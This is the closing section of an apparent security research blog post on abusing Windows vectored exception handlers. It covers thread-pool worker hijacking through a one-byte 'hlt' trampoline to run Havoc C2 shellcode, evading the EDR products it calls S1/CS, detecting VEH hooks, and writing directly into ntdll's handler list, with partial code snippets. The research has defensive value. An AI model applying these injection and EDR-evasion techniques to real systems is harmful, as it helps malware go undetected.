![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FLKTaQdhVqGg6zJHvEGWL%252Fmem.gif%3Falt%3Dmedia%26token%3D2dbc74d7-7c44-41bd-866c-1c0a559e5b0f&width=768&dpr=3&quality=100&sign=3415695a&sv=2)

_With Havoc I observed RX memory_

### [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#hlt-youre-coming-with-me)    **HLT! You're Coming with Me**

Instead of overwriting the `StartRoutine` of a worker factory with our C2 payload, we can overwrite a single instruction to redirect a newly spawn thread to our code instead (single byte trampoline).

By default, the `StartRoutine` of worker factories is `TppWorkerThread`, so depending which option you choose (discussed shortly), duplicating a `TpWorkerFactory` handle might not be needed as we can get the afromentioned `StartRoutine` address in our local process.

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252F8qO9UjUBzXj7PLRX2Ytd%252Fstartroutine.png%3Falt%3Dmedia%26token%3D28bb18de-3c27-4811-83fb-916ac695eb4d&width=768&dpr=3&quality=100&sign=e4ec6650&sv=2)

We can simply overwrite the `push rdi` instruction with something that will cause an exception in the newly spawned thread. For this, the `hlt` instruction was chosen, as the opcode for it is a single byte (0xf4). We will also update our `VEH` to redirect execution flow to our code when an `EXCEPTION_PRIV_INSTRUCTION` is thrown:

Copy

```
...
cmp edx, 0xC0000096
jne 0x28
...
```

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FkKuSki8K8Ja1cuG1YTgT%252Fhlt.png%3Falt%3Dmedia%26token%3D7f7b9fdd-e006-4c01-88ab-54bea8528fcc&width=768&dpr=3&quality=100&sign=53c3ea90&sv=2)

As this example is more stable compared to the previous one, it was also tested against S1. Only thing we have to do differently is to allocate a separate memory region for the `VEH` to ignore `PAGE_GUARD` exceptions our payload will trigger later on. Here's another schizo flowchart (MEM #2 gets moved to private memory, but you know that already):

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FcopId848bxE6Efmhct4o%252Fvehxpool.png%3Falt%3Dmedia%26token%3D268c0844-8e12-4f62-81e1-957984f68bbb&width=768&dpr=3&quality=100&sign=6acfcbf5&sv=2)

PEB _patching shellcode was prepended to our Havoc shellcode (to patch ntdll address, and to add delay)_

And now, we have two options:

- Wait until a new thread naturally spawns, and use synchronization objects so we can revert the startroutine when it occurs

- Duplicate a `TpWorkerFactory` handle, change memory permissions to RWX, increment the `TotalWorkerCount` of our target to force the immediate creation of a new worker thread, and then revert the startroutine (we'll go for this)


After stealing a thread, we can easily revert the startroutine as the modified opcode acts like a trampoline in our case.

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FLzxzElMzhW5a3mErNOsw%252Fvehxpool.gif%3Falt%3Dmedia%26token%3Df55bb4d6-8691-4d00-abfd-2fb4f954ba7a&width=768&dpr=3&quality=100&sign=724cedb3&sv=2)

_S1's VEH was overwritten in both our local process (for vectored syscalls) and our target process (for execution flow and exception controlling purposes)_

One big thing to note that when hijacking a worker thread by forcing it into raising an exception, is the cursed stack you will get:

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FRNGuX2qmEbMYqDIZdiuc%252Fcursed-stack.png%3Falt%3Dmedia%26token%3Daad86012-8ae2-4c5c-8e46-827031d92332&width=768&dpr=3&quality=100&sign=1a1bc020&sv=2)

### [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#undefined)

## [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#misc)    MISC

### [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#detecting-a-veh-hooking-edr)    **Detecting a VEH Hooking EDR**

One easy way of figuring out if you are against S1/CS is to simply check the Handler List. If `FirstExceptionHandler` is not pointing back to itself, you know that there are `VEH` hooks in play.

Copy

```
ULONG_PTR list = (ULONG_PTR)ntdll + OFFSET;

if ( *(PVOID*)(list + 8) != (list + 8) ) {
    printf("[!] VEH hooks present\n");
}
```

_If you have the base address of ntdll, you can simply use static offsets so you don't need to use any API-s_

After you have determined that there are hooks present, highly specific checks can be made to determine the exact EDR vendor.

### [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#anti-anti-debug-club)    **Anti Anti-Debug Club**

When dynamically analyzing malware that employs VEHs to detect HWBPs etc, it is possible to simply overwrite its `VEH` as demonstrated.

### [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#stuff)    **Stuff**

In all of the examples that dealt with `VEH` overwriting or similar, ntdll itself wasn't touched as the location where the list is located at is R/O by default. It is possible to adjust the pointer to the first handler by changing permissions etc, but this can have funky side effects - after simply changing permissions from R -> RW -> R, doing vectored syscalls later on by causing an `ACCESS_VIOLATION` would force our sillyware to execute `NtTerminateProcess` instead.

But something like this will work (just don't forget to flip the `ProcessUsingVEH` bit in `PEB`):

Copy

```
int ref = 0;
DWORD dwOld = 0;
PVOID pHandlerList = HandlerList();
PVOID pListStart = (ULONG_PTR)pHandlerList + 8;

VEH_HANDLER_ENTRY* entry = (VEH_HANDLER_ENTRY*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VEH_HANDLER_ENTRY));
entry->Entry.Flink = pListStart;
entry->Entry.Blink = pListStart;
entry->SyncRefs = &ref;
entry->VectoredHandler = EncodePointer(VehhyBoy);

VirtualProtect(pListStart, 8, PAGE_READWRITE, &dwOld);
memcpy(pListStart, &entry, 8);
VirtualProtect(pListStart, 8, dwOld, &dwOld);
```

### [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#c)    **C\#**

When you write anything useful in C#, the 64bit version of `clr.dll` is loaded, which in turn will give you access to a free `VEH` to abuse. Wanted to include some C# but it got rather cursed. Just don't try to get vectored syscalls working in C#.

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FYZnMjZF4nln7QMdkHjw1%252Fimage.png%3Falt%3Dmedia%26token%3D9629dc73-e47d-4953-a4c9-e6b8612ca78b&width=768&dpr=3&quality=100&sign=ecc47315&sv=2)

* * *

## [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#outro)    Outro

Hope this small blog helped you understand VEHs better. As stated in the intro, this should not be considered as an attack on S1/CS.

The main reason why I wrote this was due to the fact that there aren't many VEH related articles around.

The second reason is that when developing my own EDR driver, I quickly realized just how bad VEH hooking is. In addition to the "normal" performance degradation that comes with VEH hooking, adding VEH tampering checks would cause even further degradation, making it an unviable option from an actual EDR standpoint. I get it from an EDR dev perspective; it's not hard to implement, and it gets the job done. I understand that detection engineering is a pain in the ass and that Windows itself is malware, but please, ditch VEH hooks, come up with better ideas, and move to the kernel instead.

If you made it this far, hope you learned something new. Hope you can now write cool sillyware by combining `VEH` stuff with other things.

### [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#further-reading)    Further Reading

[Exploiting Windows Thread Poolsarrow-up-right](https://urien.gitbook.io/diago-lima/a-deep-dive-into-exploiting-windows-thread-pools)

[Dumping the VEH in Windows 10arrow-up-right](https://dimitrifourny.github.io/2020/06/11/dumping-veh-win10.html)

### [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#shoutout-to-the-homies)    Shoutout to the Homies

[l1ineararrow-up-right](https://x.com/l1inear), [0xTribouletarrow-up-right](https://x.com/0xtriboulet), [5piderarrow-up-right](https://x.com/C5pider), [VirtualAllocExarrow-up-right](https://x.com/VirtualAllocEx), [Urienarrow-up-right](https://x.com/uri3n), [mrd0xarrow-up-right](https://x.com/mrd0x), [NULLarrow-up-right](https://x.com/NUL0x4C)

Last updated 1 year ago